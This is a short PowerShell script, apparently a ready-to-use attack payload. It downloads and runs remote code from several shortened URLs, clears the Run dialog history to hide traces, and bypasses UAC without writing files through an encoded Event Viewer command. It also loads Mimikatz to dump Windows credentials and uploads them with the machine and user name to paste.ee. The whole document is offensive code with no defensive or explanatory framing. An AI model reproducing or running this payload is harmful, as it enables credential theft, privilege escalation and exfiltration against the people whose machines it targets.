function Invoke-Payload {
param (
	################################################
	##          API Key from paste.ee             ##
	  $api_key = ''
	################################################
	)
	
	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bWu5ef')
	Clean-RunMRU -Last
	
	$Command = "
	# Import Paste.ee API module
	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bNdwqV')
	# Import Mimikatz module
	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/1N83FXO')
	`$Creds = Invoke-Mimikatz -DumpCreds
	`$Description = 'Mimikatz Dump - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
	New-Paste -api_key $api_key -description `$Description -paste `$Creds
	"

	## Fileless bypass uac
	# Import EventVwrBypass module
	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
	# Execute bypass w/encoded command
	Invoke-EventVwrBypass -Command ('Powershell -EncodedCommand ' + $([Convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes($Command))))) -Force
}
